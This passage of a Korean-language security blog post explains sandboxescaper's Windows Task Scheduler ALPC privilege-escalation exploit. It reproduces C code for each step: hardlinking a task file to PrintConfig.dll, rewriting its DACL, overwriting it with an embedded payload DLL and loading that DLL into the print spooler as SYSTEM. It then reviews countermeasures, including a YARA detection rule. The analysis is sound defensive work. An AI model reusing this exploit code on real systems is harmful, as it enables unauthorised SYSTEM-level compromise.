&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hFind&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FindFirstFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;System32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DriverStore&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;FileRepository&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;prnms003.inf_amd64*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FindFileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BeginPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAX_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DriverStore&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;FileRepository&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrinterDriverFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAX_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EndPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Amd64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;PrintConfig.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;wmemcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrinterDriverFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FindFileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wcslen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FindFileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;FindClose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;wcscat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BeginPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrinterDriverFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;wcscat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BeginPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EndPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;(2) PrintConfig.dll의 위치를 알았으니, tasks 폴더 밑에 하드링크(UpdateTask.job -&amp;gt; PrintConfig.dll)을 만듭니다. 여기서 James Forshaw가 만든 CreateNativeHardlink를 그대로 재사용하고 있음을 알 수 있습니다. CreateHardLink(표준API)를 사용하면 PrintConfig.dll에 하드링크를 걸 수 없기 때문이죠!&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateNativeHardlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;UpdateTask.job&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BeginPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;(3) 태스크 스케쥴러 서비스의 SchRpcSetSecurity를 호출하여 UpdateTask.job의 DACL을 변경합니다. 요청이 성공하면 PrintConfig.dll이 일반사용자도 쓰기가능한 상태로 바뀔 것입니다.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RunExploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RPC_BINDING_HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RPC_STATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateBindingHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SchRpcCreateFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;UpdateTask&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;_SchRpcSetSecurity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;UpdateTask&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(4) 페이로드코드(DLL)는 익스플로잇 바이너리(PE) 안에 리소스로 포함되어 있습니다. 페이로드 데이터를 추출하여 PrintConfig.dll에 덮어씁니다.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;ALPC-TaskSched-LPE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
&lt;span class=&quot;c1&quot;&gt;// 페이로드DLL은 리소스에 포함되어 있습니다. 이 코드블록에서 페이로드 DLL을 찾습니다.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HRSRC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myResource&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FindResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAKEINTRESOURCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IDR_RCDATA1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RT_RCDATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myResourceSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SizeofResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;HGLOBAL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myResourceData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LoadResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pMyBinaryData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LockResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;myResourceData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
&lt;span class=&quot;c1&quot;&gt;//We try to open the DLL in a loop, it could already be loaded somewhere.. if thats the case, it will throw a sharing violation and we should not continue
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwBytesWritten&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BeginPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OPEN_EXISTING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                  
	&lt;span class=&quot;n&quot;&gt;WriteFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pMyBinaryData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;myResourceSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwBytesWritten&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;           
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;(5) 스풀러 서비스가 PrintConfig.dll(페이로드)를 로드하도록 만듭니다. 로드에 성공하면, 스풀러 서비스 컨텍스트(시스템권한)에서 페이로드가 실행될 것입니다.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CoInitialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IXpsOMObjectFactory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpsFactory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;CoCreateInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__uuidof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XpsOMObjectFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLSCTX_INPROC_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__uuidof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IXpsOMObjectFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpsFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;completionEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IXpsPrintJob&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;job&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IXpsPrintJobStream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobStream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;StartXpsPrintJob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;Microsoft XPS Document Writer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;Print Job 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;completionEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;jobStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;CoUninitialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;대응-방안&quot;&gt;대응 방안&lt;/h3&gt;

&lt;p&gt;James Forshaw가 발견한 하드링크 이슈는 2015년 말에 발표된 내용이지만, 최근까지도 권한상승 익스플로잇에 활용되고 있다는 사실을 실제 사례를 통해 알아보았습니다.&lt;/p&gt;

&lt;p&gt;sandboxescaper의 제로데이 공개 이후 MS가 패치를 릴리즈하기 전까지, 보안 회사와 보안리서처들이 몇 가지 대응방안을 제시했었습니다.&lt;/p&gt;

&lt;p&gt;(a) 스풀러 프로세스 감시&lt;sup id=&quot;fnref:6&quot;&gt;&lt;a href=&quot;#fn:6&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;스풀러 프로세스(spoolsv.exe)의 자식프로세스 생성 행위를 감시하는 방법입니다. 이 방법의 단점은 다음과 같습니다.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;스풀러가 아닌 다른 시스템프로세스를 통해서 페이로드를 실행시킬 수 있습니다.&lt;/li&gt;
  &lt;li&gt;스풀러를 통해서 실행되는 페이로드에서 자식프로세스를 생성하지 않는다면 제안된 방법을 쉽게 우회할 수 있습니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(b) tasks 폴더에서 하드링크 생성을 감시하는 방법&lt;sup id=&quot;fnref:6:1&quot;&gt;&lt;a href=&quot;#fn:6&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;하드링크 생성 로그를 확인하는 방법입니다. 하드링크가 tasks 폴더에서 생성된 사실이 있다면 비정상 행위로 보는 것입니다. 이 방법의 단점은 다음과 같습니다.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;sandboxescaper의 익스플로잇을 탐지할 수 있으나, 익스플로잇(취약점)이 다른 폴더에 하드링크를 생성할 수 있는 경우라면 탐지하기 어렵습니다. 그렇다고 모든 하드링크 생성 행위를 비정상적으로 판단할 수도 없는 노릇이죠.&lt;/li&gt;
  &lt;li&gt;행위(공격)가 발생했다는 이벤트만 알려줄 뿐, 공격을 차단하지 못합니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(c) 익스플로잇 바이트시퀀스(시그니처) 탐지 방법&lt;sup id=&quot;fnref:6:2&quot;&gt;&lt;a href=&quot;#fn:6&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;대부분의 AV에서 택하는 방식일 것이라 생각합니다. 공개된 YARA 룰은 다음과 같습니다.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rule TaskSched
{
 strings:
 $a = “c:\\windows\\tasks” wide ascii nocase
 $b = “.job” wide ascii nocase
 $c = “ncalrpc” wide ascii nocase
 $d = “MZ” wide ascii
 
 condition:
 $a and $b and $c and $d
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;윈도우 실행파일(PE)이고 “.job” “c:\windows\tasks” “ncalrpc” 문자열이 포함되어 있으면 익스플로잇이라고 판단하는 것입니다. 이 방법의 단점은 다음과 같습니다.&lt;/p&gt;
&lt;ul&gt;
